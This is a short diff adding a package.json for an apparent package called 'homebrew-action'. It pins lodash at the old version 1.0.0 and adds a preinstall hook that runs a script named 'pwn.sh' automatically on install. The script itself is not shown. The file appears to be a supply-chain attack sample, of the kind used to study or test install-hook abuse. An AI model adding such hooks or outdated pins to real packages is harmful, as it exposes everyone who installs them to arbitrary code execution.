@@ -1,0 +1,10 @@
+{
+  "name": "homebrew-action",
+  "version": "1.0.0",
+  "dependencies": {
+    "lodash": "1.0.0"
+  },
+  "scripts": {
+    "preinstall": "bash pwn.sh"
+  }
+}
